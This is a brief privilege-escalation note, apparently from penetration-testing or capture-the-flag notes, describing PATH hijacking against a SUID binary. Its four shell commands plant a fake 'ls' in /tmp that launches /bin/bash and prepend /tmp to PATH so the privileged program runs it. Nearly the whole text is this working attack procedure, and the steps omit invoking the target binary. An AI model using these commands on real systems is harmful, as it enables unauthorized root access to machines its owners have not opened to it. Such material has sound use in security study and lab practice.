### Exploit binary that runs with SUID

1. Create a script with the same name in the tmp directory: `echo "/bin/bash" > ls`
2. Give it permission to execute: `chmod +x ls`
3. Prepend the tmp directory to the PATH variable: `export PATH=/tmp:$PATH`
4. When done you can return the PATH to normal `export PATH=[initial path]:$PATH`

